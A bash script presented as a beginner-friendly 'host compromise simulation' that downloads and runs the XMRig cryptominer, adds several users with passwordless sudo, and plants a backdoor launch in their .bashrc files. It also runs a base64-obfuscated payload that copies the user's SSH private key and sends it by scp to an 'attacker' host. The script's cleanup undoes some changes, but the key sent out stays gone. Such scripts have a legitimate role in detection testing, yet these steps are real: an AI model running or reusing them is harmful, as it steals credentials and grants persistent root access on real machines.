#!/usr/bin/env bash
set -euo pipefail

echo "[*] Starting host compromise simulation (Beginner-Friendly Version)"

# === Basic Settings ===
TMP_DIR="/tmp/xmrig-sim"      # Temporary directory for miner files
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz"
USER_PREFIX="demo_eviluser"   # Prefix for fake user accounts
USER_COUNT=5                  # Number of fake users to create
BACKDOOR_FILE="/usr/bin/.openbackdoor"  # Simulated malicious binary path
declare -a CREATED_USERS      # Array to store added usernames

# === 1. Install and run xmrig ===

download_xmrig() {
  XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz"
  INSTALL_DIR="$HOME/xmrig-demo"
  BINARY="$INSTALL_DIR/xmrig"

  if [ ! -f "$BINARY" ]; then
    echo "[1] Downloading XMRig to $BINARY..."
    mkdir -p "$INSTALL_DIR"
    curl -sL "$XMRIG_URL" -o "$INSTALL_DIR/xmrig.tar.gz"
    tar -xvzf "$INSTALL_DIR/xmrig.tar.gz" -C "$INSTALL_DIR"
    # Move the binary to a clean path
    mv "$INSTALL_DIR"/xmrig-*/xmrig "$BINARY"
    chmod +x "$BINARY"
    # Clean up the leftover extracted folders
    rm -rf "$INSTALL_DIR"/xmrig-* "$INSTALL_DIR/xmrig.tar.gz"
  else
    echo "[1] XMRig already exists at $BINARY"
  fi

  echo "[1] Running XMRig (simulated miner activity)..."
  "$BINARY" --url=donate.v2.xmrig.com:3333 --user=localtest --donate-level=0 --tls=false &
}


# === 2. Add fake privileged users ===
add_privileged_users() {
  echo "[2] Creating $USER_COUNT fake users with sudo access..."
  for i in $(seq 1 $USER_COUNT); do
    user="${USER_PREFIX}_$((RANDOM % 10000))"
    CREATED_USERS+=("$user")
    echo "  [+] Adding user: $user"

    sudo useradd -m -s /bin/bash "$user"
    echo "$user ALL=(ALL) NOPASSWD:ALL" | sudo tee "/etc/sudoers.d/$user" > /dev/null

    sudo -u "$user" bash -c "touch ~/.bashrc"
    echo "$BACKDOOR_FILE &" | sudo tee -a "/home/$user/.bashrc" > /dev/null
    sudo chown "$user:$user" "/home/$user/.bashrc"
  done
}

# === 3. Run a suspicious-looking base64 command ===
run_base64_payload() {
  echo "[4] Running a suspicious base64-encoded command..."

  cat <<'EOF' | base64 -d | bash
IyEvYmluL2Jhc2gKCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9N
RS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNw
ICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAv
c3NoX2tleXMvaWRfcnNhCiAgICBzc2hwYXNzIC1wICdhdHRhY2tlcjEyMzQ1IScgc2NwIH4vdG1w
L3NzaF9rZXlzL2lkX3JzYSBhdHRhY2tlckAxNzIuMzEuMzAuMTAzOn4vCiAgZmkKZmkK
EOF
}

# === 4. Cleanup Function to Undo Simulation Changes ===
cleanup_simulation() {
  echo "[5] Cleaning up simulation artifacts..."

  # Stop XMRig miner
  echo "  [-] Stopping XMRig miner..."
  pkill -f xmrig || echo "    [i] No XMRig process found."

  # Delete created users and sudoers files
  echo "  [-] Removing created users..."
  for user in "${CREATED_USERS[@]}"; do
    echo "    [-] Deleting user: $user"
    sudo userdel -r "$user" 2>/dev/null || echo "      [!] Failed to delete $user"
    sudo rm -f "/etc/sudoers.d/$user"
  done

  # Remove XMRig binary and directory
  echo "  [-] Deleting XMRig install directory..."
  rm -rf "$HOME/xmrig-demo"

  # Remove backdoor file if defined
  if [ -n "$BACKDOOR_FILE" ]; then
    echo "  [-] Removing backdoor file..."
    rm -f "$BACKDOOR_FILE"
  fi

  echo "[✔] Cleanup completed successfully."
}


# === Run All Steps ===

download_xmrig
add_privileged_users
run_base64_payload
sleep 300
cleanup_simulation
